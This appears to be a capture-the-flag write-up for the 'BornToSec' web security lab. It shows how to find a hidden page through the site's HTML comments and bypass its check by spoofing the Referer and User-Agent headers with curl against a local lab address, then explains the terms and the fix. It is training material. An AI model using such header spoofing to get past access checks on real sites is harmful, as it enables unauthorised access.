### Exploitation process

1. Locate and click the hidden copyright link in the homepage footer:
```html
<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"><li>© BornToSec</li></a>
```

2. Open the page source (Ctrl+U) to find hidden developer instructions in HTML comments:
```html
<!-- You must come from : "https://www.nsa.gov/". -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot -->
```

3. Identify the required HTTP headers based on the hints:

    - "come from" -> `Referer` header.
    - "browser" -> `User-Agent` header.

4. Execute curl command in the terminal to spoof the headers and bypass the check:
```bash
curl -s -H "Referer: https://www.nsa.gov/" -A "ft_bornToSec" "http://192.168.56.102/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep "flag"
```

## Definitions

**Information Disclosure** A security flaw where sensitive technical information, logic hints, or debug instructions are left inside <!-- comments -->. While not rendered by the browser, they are fully visible to anyone who inspects the page source.

**HTTP Headers:**
- `Referer`: Tells the server which page the request came from
- `User-Agent`: Identifies the browser/client making the request

**curl** A command-line tool used for sending data to or from a server. It is a powerful tool for penetration testing because it allows users to manually define every part of an HTTP request, including headers that are normally locked or automated in standard web browsers.

**curl command breakdown:**
- `-s`: Silent mode, suppresses progress meter and error messages
- `-H "Referer: https://www.nsa.gov/"`: Sets custom Referer header to bypass origin check
- `-A "ft_bornToSec"`: Sets custom User-Agent header (shorthand for `-H "User-Agent: ft_bornToSec"`)
- `| grep "flag"`: Pipes output to grep to extract only lines containing "flag"

## How to Fix

### Remove Comments in Production
Never leave sensitive information in HTML comments. Use build tools to strip comments before deployment.